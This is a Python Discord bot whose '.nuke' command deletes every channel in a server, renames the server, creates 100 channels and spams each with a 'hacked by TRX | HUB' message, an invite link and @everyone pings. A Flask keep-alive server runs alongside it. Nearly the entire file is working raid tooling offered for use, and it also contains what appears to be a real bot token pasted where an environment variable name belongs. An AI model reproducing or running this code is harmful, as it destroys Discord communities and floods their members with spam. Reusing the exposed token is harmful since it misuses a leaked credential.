import discord
from discord.ext import commands
import asyncio
import os
from flask import Flask
import threading
import time

app = Flask(__name__)

@app.route('/')
def home():
    return "🟢 Bot is running 24/7", 200

def run_server():
    app.run(host='0.0.0.0', port=8080, debug=False, use_reloader=False)

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='.', intents=intents, help_command=None)

@bot.event
async def on_ready():
    print(f"{bot.user} is ready")

@bot.command()
@commands.has_permissions(administrator=True)
async def nuke(ctx):
    guild = ctx.guild
    for channel in guild.channels:
        try:
            await channel.delete()
        except:
            pass
    await guild.edit(name="89")
    for _ in range(100):
        ch = await guild.create_text_channel("89")
        asyncio.create_task(spam(ch))

async def spam(channel):
    for _ in range(90):
        await channel.send("تم التهكير من قبل TRX | HUB - النظام التراكسي\nhttps://discord.gg/EmfJq4zJm\n@here @everyone")
        await asyncio.sleep(0.05)

threading.Thread(target=run_server, daemon=True).start()

while True:
    try:
        bot.run(os.getenv("MTUzODMwNzYzOTIxMTk4Mjg2OA.G57Zse.JFmDDki971GR7Bo1RQwhRxa6QDhruVDx8bByEA"))
    except:
        time.sleep(5)